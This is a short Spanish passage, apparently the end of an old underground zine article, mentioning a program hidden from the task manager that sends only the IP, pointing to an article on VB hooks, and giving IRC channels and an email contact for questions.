ministrador  de tareas,  ademas solo manda  la IP. Si quereis saber mas os reco-
miendo que leais el articulo sobre Hooks en VB de W3ndig0. 
 Para cualquier  duda  podeis encontrarme en #codex,#disidents o #el3ktro o man-
darme un mail a meleth@disidents.no-ip.org.










```

</div>
